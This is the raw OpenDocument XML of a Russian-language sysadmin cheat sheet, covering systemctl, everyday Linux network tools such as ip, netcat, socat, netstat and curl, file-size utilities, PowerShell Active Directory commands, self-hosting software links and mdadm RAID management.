      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">systemctl try-restart name.service - </text:span><text:span text:style-name="T1">перезапуск</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">сервиса</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">только</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T1">если</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">он</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">запущен</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:soft-page-break/><text:span text:style-name="T3">systemctl reload name.service - </text:span><text:span text:style-name="T1">перезагрузка</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">конфигурации</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">сервиса</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">systemctl status name.service - проверка, запущен ли сервис с детальным выводом состояния сервиса</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">systemctl is-active name.service - проверка, запущен ли сервис с простым ответом: active или inactive</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">systemctl list-units --type service --all - отображение статуса всех сервисов</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">systemctl enable name.service - активирует сервис (позволяет стартовать во время запуска системы)</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">systemctl disable name.service - </text:span><text:span text:style-name="T1">деактивирует</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">сервис</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">systemctl reenable name.service - </text:span><text:span text:style-name="T1">деактивирует</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">сервис</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">и</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">сразу</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">активирует</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">его</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">systemctl is–enabled name.service - </text:span><text:span text:style-name="T1">проверяет</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T1">активирован</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">ли</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">сервис</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">systemctl list-unit-files --type service - </text:span><text:span text:style-name="T1">отображает</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">все</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">сервисы</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">и</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">проверяет</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T1">какие</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">из</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">них</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">активированы</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">systemctl mask name.service - </text:span><text:span text:style-name="T1">заменяет</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">файл</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">сервиса</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">симлинком</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">на</text:span><text:span text:style-name="T3"> /dev/null, </text:span><text:span text:style-name="T1">делая</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">юнит</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">недоступным</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">для</text:span><text:span text:style-name="T3"> systemd</text:span></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">systemctl unmask name.service - </text:span><text:span text:style-name="T1">возвращает</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">файл</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">сервиса</text:span><text:span text:style-name="T3">, </text:span><text:span text:style-name="T1">делая</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">юнит</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">доступным</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">для</text:span><text:span text:style-name="T3"> system</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Полезные сетевые утилиты </text:span><text:span text:style-name="T3">linux</text:span><text:span text:style-name="T1">:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">ip</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Утилита управляет интерфейсами, сетевыми устройствами и туннелями. Всем сетевым стеком </text:span><text:span text:style-name="T3">linux</text:span><text:span text:style-name="T1">. Например: </text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">ip</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">addr</text:span><text:span text:style-name="T1"> </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Покажет список всех сетевых адресов. Тоже самое делает утилита </text:span><text:span text:style-name="T3">ifconfig</text:span><text:span text:style-name="T1"> без параметров. </text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">ip</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">route</text:span><text:span text:style-name="T1"> </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Покажет таблицу роутинга. Тоже самое сделает команда </text:span><text:span text:style-name="T3">route</text:span><text:span text:style-name="T1">. </text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">ip</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">link</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">set</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">eth</text:span><text:span text:style-name="T1">0 </text:span><text:span text:style-name="T3">up</text:span><text:span text:style-name="T1"> </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Поднимает интерфейс </text:span><text:span text:style-name="T3">eth</text:span><text:span text:style-name="T1">0. Это можно также сделать с помощью </text:span><text:span text:style-name="T3">ifconfig</text:span><text:span text:style-name="T1">. </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">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3">Alpine</text:span><text:span text:style-name="T1"> или </text:span><text:span text:style-name="T3">openwrt</text:span><text:span text:style-name="T1">) не используют </text:span><text:span text:style-name="T3">ifconfig</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">route</text:span><text:span text:style-name="T1"> и другие “большие” утилит. Там оставляют только </text:span><text:span text:style-name="T3">ip</text:span><text:span text:style-name="T1">. Вот с помощью нее и придется выполнять все сетевые задачи. </text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">nc</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Полное имя </text:span><text:span text:style-name="T3">netcat</text:span><text:span text:style-name="T1"> - на него она тоже откликается. Это утилита, позволяет слушать и выполнять </text:span><text:span text:style-name="T3">TCP</text:span><text:span text:style-name="T1"> и </text:span><text:span text:style-name="T3">UDP</text:span><text:span text:style-name="T1"> соединении. </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">И так что может </text:span><text:span text:style-name="T3">netcat</text:span><text:span text:style-name="T1">? </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Открываем одно окно терминала и делаем там </text:span><text:span text:style-name="T3">nc</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">l</text:span><text:span text:style-name="T1"> 12345 это будет наш сервер. Отрываем другое окно и пишем в нем </text:span><text:span text:style-name="T3">nc</text:span><text:span text:style-name="T1"> 127.0.0.1 12345 - это наш клиент. Печатаем там “</text:span><text:span text:style-name="T3">Hello</text:span><text:span text:style-name="T1">!” нажимаем </text:span><text:span text:style-name="T3">enter</text:span><text:span text:style-name="T1">. В первом окне видим эту фразу. Ура! Мы написали однонаправленный чат.</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">Эта утилита пригодиться чтобы проверить жив ли сервер и слушает ли от вообще на этом порту? С помощью </text:span><text:span text:style-name="T3">nc</text:span><text:span text:style-name="T1"> можно переслать файл и даже просканировать порты. </text:span><text:span text:style-name="T3">Http</text:span><text:span text:style-name="T1"> сервер еще можно написать.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">socat</text:span><text:span text:style-name="T1"> </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Это труба, которая позволяет соединить два сокета между собой. </text:span><text:span text:style-name="T3">Mysql</text:span><text:span text:style-name="T1"> слушает только на </text:span><text:span text:style-name="T3">local</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">socket</text:span><text:span text:style-name="T1"> а мы хотим на его ходить по </text:span><text:span text:style-name="T3">tcp</text:span><text:span text:style-name="T1">. Выглядит это так: </text:span><text:span text:style-name="T3">socat</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">TCP</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">LISTEN</text:span><text:span text:style-name="T1">:3307,</text:span><text:span text:style-name="T3">reuseaddr</text:span><text:span text:style-name="T1">,</text:span><text:span text:style-name="T3">fork</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">UNIX</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">CONNECT</text:span><text:span text:style-name="T1">:/</text:span><text:span text:style-name="T3">var</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">lib</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">mysql</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">mysql</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">sock</text:span><text:span text:style-name="T1"> </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Конектор к </text:span><text:span text:style-name="T3">netcat</text:span><text:span text:style-name="T1"> из предыдущего примера: </text:span><text:span text:style-name="T3">socat</text:span><text:span text:style-name="T1"> - </text:span><text:span text:style-name="T3">TCP</text:span><text:span text:style-name="T1">4:127.0.0.1:80 </text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">Если вам нужно перебросить сокет в другое место присмотритесь к </text:span><text:span text:style-name="T3">socat</text:span><text:span text:style-name="T1"> он вам скорее всего поможет.</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T3">netstat</text:span><text:span text:style-name="T1"> </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Эта утилита показывает текущее состояние сетевого стека. Она даст вам ответ на вопросы: что у меня там на порту 9081 висит? </text:span><text:span text:style-name="T3">netstat</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">nltp</text:span><text:span text:style-name="T1"> Что с моими </text:span><text:span text:style-name="T3">tcp</text:span><text:span text:style-name="T1"> соединениями и кто прямо сейчас ко мне подключен? </text:span><text:span text:style-name="T3">netstat</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">atp</text:span><text:span text:style-name="T1"> </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">У этой утилиты есть младший (или старший по возможностям) брат </text:span><text:span text:style-name="T3">ss</text:span><text:span text:style-name="T1"> посмотрите на него тоже может он понравиться больше.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">curl</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Утилита для передачи файлов. Так написано в ее описании. Чем же она замечательна? Она умеет кучу протоколов: </text:span><text:span text:style-name="T3">DICT</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">FILE</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">FTP</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">FTPS</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">GOPHER</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">HTTP</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">HTTPS</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">IMAP</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">IMAPS</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">LDAP</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">LDAPS</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">POP</text:span><text:span text:style-name="T1">3, </text:span><text:span text:style-name="T3">POP</text:span><text:span text:style-name="T1">3</text:span><text:span text:style-name="T3">S</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">RTMP</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">RTSP</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">SCP</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">SFTP</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">SMB</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">SMBS</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">SMTP</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">SMTPS</text:span><text:span text:style-name="T1">, </text:span><text:span text:style-name="T3">TELNET</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">and</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">TFTP</text:span><text:span text:style-name="T1">. В каждом протоколе она знает множество версий, например </text:span><text:span text:style-name="T3">HTTP</text:span><text:span text:style-name="T1"> она может до версии 2. Умеет подставлять хидера, куки, ходить по </text:span><text:span text:style-name="T3">SSL</text:span><text:span text:style-name="T1">, использовать </text:span><text:span text:style-name="T3">proxy</text:span><text:span text:style-name="T1"> разных видов. Можно отлаживать </text:span><text:span text:style-name="T3">http</text:span><text:span text:style-name="T1">(</text:span><text:span text:style-name="T3">s</text:span><text:span text:style-name="T1">) соединение с помощью -</text:span><text:span text:style-name="T3">v</text:span><text:span text:style-name="T1">. Примеры: </text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">curl</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">http</text:span><text:span text:style-name="T1">://</text:span><text:span text:style-name="T3">artscene</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">textfiles</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">com</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">asciiart</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">unicorn</text:span><text:span text:style-name="T1"> </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Единорог! </text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">curl</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">v</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">http</text:span><text:span text:style-name="T1">://127.0.0.1:12345 </text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">Соединяемся с сервером из примера </text:span><text:span text:style-name="T3">netcat</text:span><text:span text:style-name="T1">. В консоле сервера увидим </text:span><text:span text:style-name="T3">http</text:span><text:span text:style-name="T1"> запрос. После этого все остановиться </text:span><text:span text:style-name="T3">curl</text:span><text:span text:style-name="T1"> будет ждать ответ. И если вы руками его введете покажет его.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Как создать файл произвольного размера в </text:span><text:span text:style-name="T3">Linux</text:span><text:span text:style-name="T1">?</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">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3">B</text:span><text:span text:style-name="T1"> с помощью наиболее популярных утилит «</text:span><text:span text:style-name="T3">fallocate</text:span><text:span text:style-name="T1">» и «</text:span><text:span text:style-name="T3">truncate</text:span><text:span text:style-name="T1">».</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Fallocate</text:span><text:span text:style-name="T1">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3">fallocate</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">l</text:span><text:span text:style-name="T1"> 10</text:span><text:span text:style-name="T3">M</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">test</text:span><text:span text:style-name="T1">_</text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">txt</text:span><text:span text:style-name="T1">».</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Truncate</text:span><text:span text:style-name="T1"> используется для уменьшения или расширения размера файла до указанного размера. Чтобы создать файл размером 10</text:span><text:span text:style-name="T3">MB</text:span><text:span text:style-name="T1">, будем использовать </text:span><text:soft-page-break/><text:span text:style-name="T1">команду «</text:span><text:span text:style-name="T3">truncate</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">s</text:span><text:span text:style-name="T1"> 10</text:span><text:span text:style-name="T3">MB</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">test</text:span><text:span text:style-name="T1">_</text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">_2.</text:span><text:span text:style-name="T3">txt</text:span><text:span text:style-name="T1">». Используйте команду «</text:span><text:span text:style-name="T3">ls</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">l</text:span><text:span text:style-name="T1">», чтобы проверить заданный размер файлов.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Размер допустимо задавать обозначениями:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"><text:s/></text:span><text:span text:style-name="T3">• KB • KiB • K</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"> • MB • MiB • M</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s/>• GB • GiB • G</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"> • TB • TiB • T</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"> • PB • PiB • P</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"> • ZB • ZiB • Z</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3"> • YB • YiB • Y</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Полезные команды Powershell для Active Directory:</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">Получить всех пользователей </text:span><text:span text:style-name="T3">AD</text:span><text:span text:style-name="T1"> в домене -- </text:span><text:span text:style-name="T3">Get</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">aduser</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">properties</text:span><text:span text:style-name="T1"> * -</text:span><text:span text:style-name="T3">filter</text:span><text:span text:style-name="T1"> *</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T3">Модуль импорта Active Directory -- Import-module activedirectory</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Получить все компьютеры из домена -- </text:span><text:span text:style-name="T3">Get</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">adcomputer</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">properties</text:span><text:span text:style-name="T1"> * -</text:span><text:span text:style-name="T3">filter</text:span><text:span text:style-name="T1"> *</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Отключить пользователя </text:span><text:span text:style-name="T3">AD</text:span><text:span text:style-name="T1"> по имени учетной записи </text:span><text:span text:style-name="T3">SAM</text:span><text:span text:style-name="T1"> -- </text:span><text:span text:style-name="T3">Disable</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">ADaccount</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">identity</text:span><text:span text:style-name="T1"> "</text:span><text:span text:style-name="T3">Name</text:span><text:span text:style-name="T1">"</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Экспорт данных в формат CSV -- Get-adcomputer -properties * -filter * |export-csv "give path"</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Получить имя учетной записи AD Groups SAM -- Get-ADgroup -identity "provide group name"</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Выбрать конкретный атрибут пользователя -- </text:span><text:span text:style-name="T3">Get</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">aduser</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">properties</text:span><text:span text:style-name="T1"> * -</text:span><text:span text:style-name="T3">filter</text:span><text:span text:style-name="T1"> *</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Получить информацию о домене -- </text:span><text:span text:style-name="T3">Get</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">ADdomain</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Установите роль Active Directory -- Install-windowsfeature AD-Domain-Services</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">Получить список контроллеров домена -- </text:span><text:span text:style-name="T3">Get</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">ADDomainController</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Полезный софт для самохостинга:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Home Assistant (https://github.com/home-assistant/core) и Node-RED (https://github.com/node-red/node-red) - управление умным домом.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Pi-hole (https://github.com/pi-hole/pi-hole) - фильтрация интернет-трафика во всей сети, блокировка рекламы.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Plex (https://github.com/plexinc/pms-docker) - проприетарный медиасервер для стриминга (в качестве свободной альтернативы можно использовать Jellyfin (https://github.com/jellyfin/jellyfin)).</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">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1">(https://github.com/Prowlarr/Prowlarr) для интеграции Lidarr, Mylar3, Radarr, Readarr и Sonarr в одном интерфейсе.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Nextcloud (https://github.com/nextcloud/server) - опенсорсная замена Google Drive и другим облачным хостингам.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">PhotoPrism (https://github.com/photoprism/photoprism) - хранение фотографий, красивый интерфейс для просмотра альбомов и удалённого доступа.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Invidious (https://github.com/iv-org/invidious) - клиент для YouTube без трекинга и рекламы.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Nitter (https://github.com/zedeus/nitter) - фронтенд для Twitter (если вы им ещё пользуетесь).</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">LibReddit (https://github.com/spikecodes/libreddit) - альтернативный приватный фронтенд для Reddit, тоже без трекинга и рекламы.</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">SyncThing (https://github.com/syncthing) - синхронизация файлов между всеми устройствами.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Code Server (https://github.com/cdr/code-server) - запуск VS Code (https://github.com/Microsoft/vscode) на сервере и удалённый доступ из браузера.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Vaultwarden (https://github.com/dani-garcia/vaultwarden) - неофициальный сервер для менеджера паролей Bitwarden.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Tailscale (https://github.com/tailscale/tailscale) - не требующий настройки VPN, который даёт доступ к вашему серверу из любой точки мира.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Synapse (https://github.com/matrix-org/synapse) - свой инстанс Matrix для децентрализованных чатов, совместимый с клиентами Element (https://github.com/vector-im/element-web).</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Electrs (https://github.com/getumbrel/umbrel-electrs) - быстрый и эффективный сервер для кошелька Electrum.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Gitea (https://github.com/go-gitea/gitea) - простой хостинг Git.</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">Uptime Kuma (https://github.com/louislam/uptime-kuma) - мониторинг аптайма для своего сервера.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Как прочитать файл с ограниченными правами?</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">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1">«Проводника» введите команду «cmd» и нажмите «ENTER». Так вы запустите «Командную строку» с привязкой к папке.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Шпаргалка по MDRAID:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Создание массива:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">mdadm --create --verbose /dev/md0 --level=1 <text:s/>--raid-devices=2 /dev/sda1 /dev/sdb1</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">После чего нужно создать конфигурационный файл mdadm.conf</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">mdadm --detail --scan &gt; /etc/mdadm/mdadm.conf</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">И записать изменения в загрузочный образ:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">update-initramfs -u</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Работа с массивом</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Пометка диска как сбойного</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">Диск в массиве можно условно сделать сбойным, ключ --fail (-f):</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T3">mdadm /dev/md0 --fail /dev/hde1</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">mdadm /dev/md0 -f <text:s text:c="4"/>/dev/hde1</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Удаление сбойного диска</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Сбойный диск можно удалить с помощью ключа --remove (-r):</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">mdadm /dev/md0 --remove /dev/hde1</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">mdadm /dev/md0 -r <text:s text:c="6"/>/dev/hde1</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Добавление нового диска</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Добавить новый диск в массив можно с помощью ключей --add (-a) и --re-add:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">mdadm /dev/md0 --add /dev/hde1</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">mdadm /dev/md0 -a <text:s text:c="3"/>/dev/hde1</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Сборка существующего массива</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">mdadm --assemble /dev/md0 /dev/hde1 /dev/hdf2 /dev/hdg1</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">mdadm --assemble --scan</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Проверить состояние массива и получить информацию и массиве</text:span></text:p>
